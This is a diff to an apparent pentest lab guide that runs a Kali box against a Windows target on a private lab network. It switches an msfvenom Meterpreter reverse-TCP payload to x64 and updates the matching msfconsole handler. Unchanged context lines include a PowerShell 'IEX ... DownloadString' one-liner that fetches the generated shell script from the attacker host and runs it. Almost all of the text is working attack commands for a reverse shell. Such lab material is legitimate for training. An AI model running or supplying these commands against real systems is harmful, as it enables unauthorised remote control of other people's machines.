@@ -346,9 +346,11 @@ ls -la /vagrant/exploits/lnk/
 vagrant ssh kali
 
 # Create payload
-msfvenom -p windows/meterpreter/reverse_tcp \
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LHOST=192.168.56.101 \
     LPORT=4444 \
+    -a x64 \
+    --platform windows \
     -f psh \
     -o /vagrant/exploits/lnk/shell.ps1
 
@@ -419,7 +421,7 @@ cat /vagrant/exploits/lnk/shell.ps1
 # Should start with: function, $, or Invoke-
 
 # Test payload manually on Kali
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; exploit"
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; exploit"
 
 # Then on Windows:
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
